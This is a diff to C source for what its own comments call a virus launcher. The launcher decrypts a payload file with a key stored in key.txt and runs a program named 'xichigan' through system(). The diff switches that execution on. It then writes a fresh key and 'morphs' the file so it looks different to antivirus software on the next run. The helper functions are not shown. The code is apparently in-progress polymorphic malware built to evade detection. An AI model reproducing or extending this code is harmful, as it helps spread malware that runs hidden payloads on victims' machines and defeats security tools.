@@ -17,27 +17,41 @@ int main(int argc, char*argv[]) {
 		Decrypt the file MtoX.c using the key in key.txt
 	*/
 	// Get the key from key.txt
-	fp = fopen("key.txt","r");
-	fscanf (fp, "%d", &key); 
-	fclose(fp);
+	keyFp = fopen("key.txt","r");
+	fscanf (keyFp, "%d", &key); 
+	fclose(keyFp);
 
 	// Decrypt the file needed to run the virus
 	decryptFile(key);
 
 	/* 
-		Once the file is decrypted, start it running
+		Once the file is decrypted, start xichigan running
 	*/
-	//system ("xichigan");
+	system ("xichigan");
 
 	// Wait for xichigan to finish
+
+	/* 
+		Get a key to encrypt the file with (8 bit key) = 1-255 DEC 
+		and write it to key.txt to use when decrypting next time
+	*/
+	srand(time(NULL));
+	key = rand() % 255 + 1; 
+	key = 0; // TODO delete
+
+	keyFp = fopen("key.txt","w");
+	fprintf (keyFp, "%d", key); 
+	fclose(keyFp);
 
 	/*
 		Encrypt/Morph the file xichigan using the key so it looks different to the antivirus next time
 	*/
 
-	// Get a new key
+	// Encrypt the file xichigan
+	//decryptFile(key); // Symmetric key; so 'decrypt' is encrypt as well
+
+	// Morph the file xichigan
 	morphFile();
-	encryptFile(key);	// TODO probably remove this
 
 	return 0;
 }
